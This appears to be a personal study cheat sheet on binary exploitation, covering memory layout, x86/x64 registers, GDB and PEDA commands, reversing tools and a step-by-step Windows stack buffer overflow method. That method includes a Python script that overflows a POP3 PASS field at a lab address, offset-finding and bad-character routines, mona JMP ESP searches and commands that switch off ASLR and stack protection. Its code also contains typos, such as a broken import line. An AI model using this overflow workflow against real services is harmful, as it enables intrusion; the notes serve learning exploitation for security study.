---
layout: page
title: Binary
permalink: /binary/
---

# Index

* [Theory](#theory)
* [Assembly](#assembly)
* [Buffer Overflows](#buffer-overflows)
* [Reversing](#reversing)

## Theory

### Memory Segments

![Memory Segments]({{ site.url }}/assets/segments.JPG)


>In C, as in other compiled languages, the compiled code goes into the text segment, while the variables reside in the remaining segments. Exactly which memory segment a variable will be stored in depends on how the variable is
defined. Variables that are defined outside of any functions are considered to be global. The static keyword can also be prepended to any variable declaration to make the variable static. If static or global variables are initialized with data, they are stored in the data memory segment; otherwise, these variables are put in the bss memory segment. Memory on the heap memory segment must first be allocated using a memory allocation function called malloc(). Usually, pointers are used to reference memory on the heap. Finally, the remaining function variables are stored in the stack memory segment. Since the stack can contain many different stack frames, stack variables can maintain uniqueness within different functional contexts.

`From 'Hacking: The Art of Exploitation'`

### Registers

`x86`

The first four registers (EAX, ECX, EDX, and EBX) are known as generalpurpose
registers. These are called the Accumulator, Counter, Data, and Base
registers, respectively. They are used for a variety of purposes, but they mainly
act as temporary variables for the CPU when it is executing machine
instructions.

The second four registers (ESP, EBP, ESI, and EDI) are also generalpurpose
registers, but they are sometimes known as pointers and indexes.
These stand for Stack Pointer, Base Pointer, Source Index, and Destination Index,
respectively. The first two registers are called pointers because they store 32-bit
addresses, which essentially point to that location in memory.

The EIP register is the Instruction Pointer register, which points to the
current instruction the processor is reading. Like a child pointing his finger
at each word as he reads, the processor reads each instruction using the EIP
register as its finger.

The remaining EFLAGS register actually consists of several bit flags that
are used for comparisons and memory segmentations.

`x64`

![Registers]({{ site.url }}/assets/register.jgp)

1. The 64-bit registers have names beginning with “R” (on 32 bit they begin with “E”)
2. There are general purpose and special purpose regisyers
3. on an X64 platform, memory addresses are 64 bit long,  but addresses greater than 0x0000fffffffffff (48 bits) will often raise exceptions in userspace.

Imagine a 64-bit linear address space where the middle doesn’t exist – you’d have a usable area (of canonical addresses) from 0x0000000000000000 to 0x00007FFFFFFFFFFF, an unusable area (of non-canonical addresses) from 0x0000800000000000 to 0xFFFF7FFFFFFFFFFF, and another usable area (of canonical addresses) from 0xFFFF800000000000 to 0xFFFFFFFFFFFFFFFF.

## Assembly

### GDB

`gcc -g program.c -o program` compile code with flags for gdb to provide extra info

`gdb -q program` open gdb in quiet mode (no banner)

`(gdb) list` print source code

`(gdb) break main` set a breakpoint

`(gdb) run` run from start till breakpoint or end

`(gdb) info register rip` print current value of a register

`(gdb) x` allows us to examine the value of a memory address

`(gdb) x\x $rip` examine\in hex value at rip 

`(gdb) x\u 0x8048434` exadmine\in unsigned decimal value at 0x8048434

`(gdb) x\2x $rip` examine 2 units at rip

`(gdb) x\12x 0x8048384` examine 12 units

The default size of a single unit is a four-byte unit called a word.

The valid size letters are as follows:
* b A single byte
* h A halfword, which is two bytes in size
* w A word, which is four bytes in size
* g A giant, which is eight bytes in size

For example

`(gdb) x/8xb` examine 8 bytes in hex

On the x86 processor values are stored in little-endian
byte order, which means the least significant byte is stored first. For example,
if four bytes are to be interpreted as a single value, the bytes must be used
in reverse order.

`(gdb) i` investigate = show address

`(gdb) x` examine = show actualy value

`(gdb) x/i $eip` examine the next instruction at $eip

`(gdb) x/3i $eip` examine the next three instructions

`(gdb) nexti` read EIP, execute it and advance EIP to the next instruction

`(gdb) x/6cb 0x8048484` read 6 bytes as ASCII chars

`(gdb) x/s 0x8048484` read as an ASCII string

`(gdb) cont` continue from a breakpoint

`(gdb) bt` backtrace, show the stack

`(gdb) x/200xg $rsp-500` get the 200g 500 back from the $rsp. Used to find nop sled for instance.

`(gdb) p &a` if you need the address of variable a

### PEDA

PEDA - Python Exploit Development Assistance for GDB extends and modernises GDB.

https://github.com/longld/peda

`pattern_create 500 buffer.txt` will create a non-repeating string to help determine the exact memory addresses of buffer overlows

###Checkec

https://github.com/slimm609/checksec.sh

Use checsec.sh to see what binary protections a file was compiled with (canaries, etc)

---

## Buffer Overflows

> Our aim: Overwrite the EIP/RIP register with the address of our shellcode

Important Registers:
1. EPB/RPB: register which points to base of the current the stack frame
2. ESP/RSP: register which points to the top of the current stack frame
3. EIP/RIP:  register which points to the next processor instruction

### Basic Windows Buffer Overflows

#### Use a script to reproduce the crash

```
#!/usr/bin/python
import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer= 'A'* 2700

try:
  print "\nSending evil buffer..."
  s.connect(('10.0.0.22',110))
  data = s.recv(1024)
  s.send('USER username' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."

except:
  print "Could not connect to POP3!"
```

#### Identify the offsets

```
msf-pattern_create -l 2700
```

```
msf-pattern_offset -l 2700 -q 39694438
```

#### Identify bad characters

Place badchars on the stack and see what gets truncated/doesn't print.
Run multiple times removing first error each time until all badchars are discovered.
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

````

4. Find an address with a useable JMP ESP

Use msf to find the hex for JMP ESP
```
msf-nasm_shell
nasm > jmp esp
00000000 FFE4 jmp esp
```
Use mona in immunity debugger to find modules we can use
```
!mona modules
```
Use mona to find instances of JMP ESP
```
!mona find -s "\xff\xe4"

Useful parameters:
-cm os=false                 #don't look in OS dlls
-cpb="bad chars in hex"      #don't include addresses with these chars
```
**Make sure the address selected doesn't have any bad chars**
**Try to find one in the original executable if possible for portability**
**Make sure to check the security on the module we are using the address from**


5. Generate shellcode
6. Pad with NOPs
7. Exploit

### Disabling OS and Compiler Security

Disable ASLR: `echo 0 > /proc/sys/kernel/randomize_va_space`

Gcc compiler options: `gcc -fno-stack-protector -z execstack`

Gcc flag for x86: `gcc -m32`

### References

http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html

http://insecure.org/stf/smashstack.html

### Great Windows Resources

https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

https://github.com/justinsteven/dostackbufferoverflowgood

---

## Reversing

### Objdump

Disassemble to intel assembly

`objdump -M intel -d <programname>`

Has many more options.

### Strings

Find all strings in a file.

`strings <program>`

### strace

Outputs all system calls a program makes

`strace <program>`

### ltrace

Outputs all library calls a program makes

`ltrace <program>`

### Radare2

R2 is a very powerful and feature rich disassembler, best for static code analysis

Open a file in r2

`r2 <program>`

Analyse all

`aaa`

Go to visual mode 

`v`

Go to graph

`v`

---
